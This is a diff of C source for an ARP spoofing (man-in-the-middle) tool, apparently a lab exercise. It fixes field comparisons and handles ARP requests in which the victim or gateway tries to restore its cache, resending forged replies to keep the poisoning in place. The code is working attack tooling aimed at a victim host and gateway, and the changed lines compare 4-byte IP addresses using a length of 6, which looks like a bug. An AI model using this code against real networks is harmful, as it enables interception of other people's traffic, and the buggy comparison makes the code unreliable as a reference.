@@ -216,8 +216,8 @@ int main(int argc, char* argv[]) {
     /* Get sender MAC address and send arp reply packet */
     if(arp_check(swap_word_endian(ethernet->ether_type))    // Is it ARP protocol?
       && swap_word_endian(arp->oper) == ARP_OPER_REP	         // Is it arp reply ?
-      &&!strcmp(arp->spa , ip_sender)                         // Is it sender ip (victim)?
-      &&!strcmp(arp->tha , mac_attacker)
+      &&!memcmp(arp->spa , ip_sender, 4)                         // Is it sender ip (victim)?
+      &&!memcmp(arp->tha , mac_attacker ,6)
       &&!memcmp(arp->tpa , ip_attacker , 4))                        
     {
       //printarr((u_char *)arp->spa,6);
@@ -234,8 +234,8 @@ int main(int argc, char* argv[]) {
     /* Get target MAC address and send arp reply packet*/
     if(arp_check(swap_word_endian(ethernet->ether_type))    // Is it ARP protocol?
       &&swap_word_endian(arp->oper) == ARP_OPER_REP          // Is it arp reply ?
-      &&!strcmp(arp->spa , ip_target)                         // Is it target ip (gateway)?
-      &&!strcmp(arp->tha , mac_attacker)
+      &&!memcmp(arp->spa , ip_target , 4)                         // Is it target ip (gateway)?
+      &&!memcmp(arp->tha , mac_attacker , 6)
       &&!memcmp(arp->tpa , ip_attacker , 4))                        
     {
       memcpy(mac_target , arp->sha , 6);                                  // Get target(gateway) mac address
@@ -272,10 +272,10 @@ int main(int argc, char* argv[]) {
     }
 
     /* Send arp reply again */
-    if(arp_check(swap_word_endian(ethernet->ether_type))    // Check arp sender(victim)'s request packet for recovery 
+    if(arp_check(swap_word_endian(ethernet->ether_type))    // Check arp sender&target's request packet for recovery 
       && swap_word_endian(arp->oper) == ARP_OPER_REQ          // Is it arp request?
-      &&!strcmp(arp->spa , ip_sender)
-      &&!strcmp(arp->tpa , ip_target))
+      &&(!memcmp(arp->spa , ip_sender , 6) || !memcmp(arp->spa , ip_attacker ,6))
+      &&!memcmp(arp->tpa , ip_target , 6))
     {
       printf("send arp reply packet to sender&target against recovery\n");
       pcap_sendpacket(handle ,(unsigned char*)arp_reply_sender_packet , 42);   
